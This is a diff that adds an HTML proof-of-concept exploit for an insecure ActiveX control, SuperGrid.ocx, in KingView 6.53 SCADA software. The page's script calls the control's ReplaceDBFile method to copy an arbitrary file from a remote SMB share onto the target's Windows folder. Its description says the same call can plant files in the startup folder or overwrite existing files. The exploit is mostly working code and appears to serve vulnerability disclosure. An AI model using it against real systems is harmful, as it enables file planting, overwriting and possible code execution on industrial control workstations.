@@ -1,0 +1,32 @@
+<html>
+<object classid='clsid:F494550F-A028-4817-A7B5-E5F2DCB4A47E' id='target'></object>
+<!--
+KingView Insecure ActiveX Control - SuperGrid 
+Vendor: http://www.wellintech.com
+Version: KingView 6.53 
+Tested on: Windows XP SP3 / IE
+Download: http://www.wellintech.com/documents/KingView6.53_EN.zip
+Author: Blake
+
+CLSID: F494550F-A028-4817-A7B5-E5F2DCB4A47E
+ProgId: SUPERGRIDLib.SuperGrid
+Path: C:\Program Files\KingView\SuperGrid.ocx
+MemberName: ReplaceDBFile
+Safe for scripting: False
+Safe for init: False
+Kill Bit: False
+IObject safety not implemented
+-->
+<title>KingView Insecure ActiveX Control Proof of Concept - SuperGrid.ocx</title>
+<p>This proof of concept will copy any arbritrary file from one location to a second location. A malicious user may be able to use this to copy a file from an attacker controlled share to the target or from the target to an attacker controlled system (ie from an attacker share to the startup folder). It can also be used to overwrite existing files.</p>
+
+<input type=button onclick="copyfile()" value="Do It!">
+<script>
+function copyfile()
+{
+	var file1 = "\\\\192.168.1.165\\share\\poc.txt"; 			//source
+	var file2 = "c:\\WINDOWS\\poc.txt"; 					//destination
+	result = target.ReplaceDBFile(file1,file2);
+}
+
+</script>
